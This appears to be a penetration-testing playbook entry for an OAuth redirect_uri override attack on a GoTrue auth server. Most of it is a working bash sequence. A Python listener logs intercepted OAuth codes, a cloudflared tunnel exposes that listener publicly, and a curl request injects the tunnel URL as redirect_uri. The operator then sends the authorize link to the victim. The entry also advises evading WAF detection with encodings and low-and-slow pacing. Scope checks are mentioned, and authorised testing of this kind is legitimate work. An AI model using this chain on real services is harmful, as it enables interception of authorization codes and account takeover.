# Live test: Cloudflare Tunnel callback catcher — wasm / guest

- source canon: `holyshit-mode/oauth-redirect-uri-impact-gate.md`
- base technique: `holyshit-mode-oauth-redirect-uri-impact-gate-live-test-cloud.md`
- bindings: **WSTG-BUSL-08** · **CWE-841** · **ATT&CK T1574**
- context: **wasm** · auth **guest** · chain role **pivot**

## Route

- probes: `s3scanner`, `cloudbrute`, `cloudlist`, `kube-hunter`, `shodan`
- chains: `cloud-full`
- gate: every probe runs through the shared scope authority (rc=1 out of estate); the 3-gate differential turns output into a finding

## Context

- platform: sandbox internals — memory/import surface, own compiled artifact only
- auth state: a filter/WAF tier fronts the target: expect canonicalization and signature matching on the raw request — the probe vocabulary's encodings (double-encode, unicode, backslash, case-split) exist exactly for this tier; the differential must clear the filter WITHOUT tripping it, or the finding is a WAF flag, not a class confirmation. Low-and-slow: one variant per request, never a burst.

## The technique

The decisive test requires capturing the OAuth redirect. If the operator owns the target and will click the link:

```bash
# 1. Stand up a tiny HTTP listener that logs ?code=
cat > /tmp/oauth_cb_listener.py <<'EOF'
import http.server, urllib.parse, sys, datetime
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(p.query)
        print(f"[{datetime.datetime.now(datetime.UTC).isoformat()}] GET {self.path}", flush=True)
        if 'code' in params:
            print(f"\n*** OAUTH CODE INTERCEPTED ***\n", flush=True)
        self.send_response(200); self.end_headers()
        self.wfile.write(b"callback captured")
    def log_message(self, *a): pass
http.server.HTTPServer(("0.0.0.0", 8888), H).serve_forever()
EOF
python3 /tmp/oauth_cb_listener.py 8888 &

# 2. Tunnel it (cloudflared is usually preinstalled)
cloudflared tunnel --url http://localhost:8888 --no-autoupdate 2>&1 | tee /tmp/cf.log &
sleep 4
TUNNEL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf.log | head -1)

# 3. Confirm GoTrue forwards YOUR tunnel URI
curl -s -o /dev/null -w "%{redirect_url}\n" \
  "https://auth.TARGET/auth/v1/authorize?provider=discord&redirect_uri=${TUNNEL}/cb"

# 4. Hand the operator the Discord authorize URL (the 302 Location from step 3)
#    They open it logged-in, click Authorize. Outcomes:
#    - Listener sees ?code= → CONFIRMED redirect_uri override works end-to-end
#    - Discord shows "Invalid OAuth" / redirect_uri_mismatch → provider rejects, chain blocked
```

Outcome interpretation:
- **Discord "Invalid OAuth" after authorize click** = Discord app has strict registered-URI validation. The GoTrue redirect_uri override is real but the chain dies at the provider. NOT a working account takeover.
- **Listener sees ?code=** = Discord app accepts the URI (loose/wildcard registration) → **CONFIRMED account takeover chain**.

Gotcha: the `state` param is bound to a GoTrue server-side session cookie the attacker doesn't have — so even a captured code may not be exchangeable without the victim's cookie. The code landing in your listener is itself the proof the override works; full takeover needs the state cookie too. Report as "redirect_uri delivery confirmed" and note the state-binding as the next gate.

## Probe adjustment (wasm × guest)

1. baseline first: the request/session with NOTHING changed
2. attack: the documented class probe, adjusted per context above
3. diff: measurable only — status/length/body — or it is not a finding

## Chain roles

- combines with a prior finding — chain detect pairs same-origin findings
- pairs-with: see `skilltree-index.md` for the sibling techniques

## Walls

- validation-only · NO-GAIN · documented-class adaptation only
- in-scope only: the scope authority refuses everything else (rc=1)
